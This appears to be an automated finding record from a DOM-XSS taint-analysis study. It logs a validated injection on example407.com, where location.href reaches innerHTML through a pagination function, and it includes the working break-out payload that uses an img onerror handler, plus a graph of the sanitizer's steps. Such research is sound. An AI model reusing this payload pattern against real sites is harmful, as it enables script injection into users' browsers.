// Finding: 0118aae9-23bd-4dd8-b167-83160cc217ef
// Finding.url: http://example407.com/channel/vculture.html##"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('93b06ddaadc24a05a800b8b8c649eaa8')><!--/*
// Finding.parentloc: http://example407.com/channel/vculture.html##"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('93b06ddaadc24a05a800b8b8c649eaa8')><!--/*
// Finding.domain: example407.com
// Finding.base_domain: example407.com
// Finding.source: location.href
// Finding.sink: innerHTML
// Sanitizer.score: 1
// Sanitizer.name: addPaginationHTML
// Sanitizer.location: http://example407.com/channel/vculture.html##"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('93b06ddaadc24a05a800b8b8c649eaa8')><!--/* - addPaginationHTML:986:17
// Finding.begin: 1197
// Finding.end: 1370
// Finding.original_uuid: e6305b2b-a783-4ea3-9936-999856c0b526
// Finding.TwentyFiveMillionFlowsId: -1693806323
// Finding.script: http://example407.com/channel/vculture.html##"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('93b06ddaadc24a05a800b8b8c649eaa8')><!--/*
// Finding.line: 1011
// Exploit.uuid: 93b06dda-adc2-4a05-a800-b8b8c649eaa8
// Exploit.success: true
// Exploit.status: validated
// Exploit.method: C
// Exploit.type: html
// Exploit.token: attribute
// Exploit.content: href
// Exploit.quote_type: "
// Exploit.tag: a
// Exploit.break_out: #"></iframe></style></script></object></embed></textarea><img src=x onerror=
// Exploit.break_in: ><!--/*
// Exploit.payload: #"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog(1)><!--/*
// Exploit.begin_taint_url: 0
// Exploit.end_taint_url: 42
// Exploit.replace_begin_url: 42
// Exploit.replace_end_url: 42
// Exploit.replace_begin_param: 81
// Exploit.replace_end_param: 81
// Issues.LargestEncodeAttrStringChain: 0
// Issues.LargestTextFragmentEncodeChainLength: 0
// Issues.HasApproximation: false
// Issues.HasMissingImplementation: false
// Issues.HasInfiniteRegexWithFunctionReplacer: false
// Issues.MergedSplitAndJoins: false
// Issues.HasUrlInRhsOfReplace: false
// Issues.HasUrlInLhsOfReplace: false
// Issues.HasCookieValueInLhsOfreplace: false
// Issues.HasCookieValueInRhsOfreplace: false
// Issues.HasCookieValueInMatchPattern: false
// Issues.HasCookieValueInExecPattern: false
// Issues.RemovedLRConcats: true
// Issues.RemovedReplaceArtifacts: false
// Issues.HasUrlInMatchPattern: false
// Issues.HasUrlInExecPattern: false
// Issues.RemovedNOPreplaces: false
// Issues.Known_sanitizer: false
// DepGraph.hash: -413087790
// DepGraph.sanitizer_hash: -59321951
// Removed LR concats 
// Removed LR concats 
// Removed LR concats 
// Removed LR concats 
// Removed LR concats 
digraph cfg {
n0 [shape=house, label="Input: x"];
n1 [shape=ellipse, label="preg_replace"];
n2 [shape=box, label="RegExp: /p=[0-9]+/"];
n3 [shape=box, label="Lit: "];
n4 [shape=box, label="Var: x"];
n5 [shape=ellipse, label="."];
n6 [shape=box, label="Lit: ?"];
n7 [shape=ellipse, label="preg_replace"];
n8 [shape=box, label="RegExp: /\?&/"];
n9 [shape=box, label="Lit: ?"];
n10 [shape=box, label="Var: x"];
n11 [shape=ellipse, label="preg_replace"];
n12 [shape=box, label="RegExp: /&+/"];
n13 [shape=box, label="Lit: &"];
n14 [shape=box, label="Var: x"];
n15 [shape=ellipse, label="."];
n16 [shape=box, label="Lit: <a href=""];
n17 [shape=ellipse, label="."];
n18 [shape=box, label="Lit: p="];
n19 [shape=ellipse, label="."];
n20 [shape=box, label="Lit: 8"];
n21 [shape=ellipse, label="."];
n22 [shape=box, label="Lit: ">"];
n23 [shape=ellipse, label="."];
n24 [shape=box, label="Lit: 8"];
n25 [shape=ellipse, label="."];
n26 [shape=box, label="Lit: </a>"];
n27 [shape=box, label="Var: x"];
n28 [shape=doubleoctagon, label="Return: x"];
n4 -> n0;
n1 -> n2;
n1 -> n3;
n1 -> n4;
n5 -> n1;
n5 -> n6;
n10 -> n5;
n7 -> n8;
n7 -> n9;
n7 -> n10;
n14 -> n7;
n11 -> n12;
n11 -> n13;
n11 -> n14;
n15 -> n16;
n15 -> n11;
n17 -> n15;
n17 -> n18;
n19 -> n17;
n19 -> n20;
n21 -> n19;
n21 -> n22;
n23 -> n21;
n23 -> n24;
n25 -> n23;
n25 -> n26;
n27 -> n25;
n28 -> n27;
}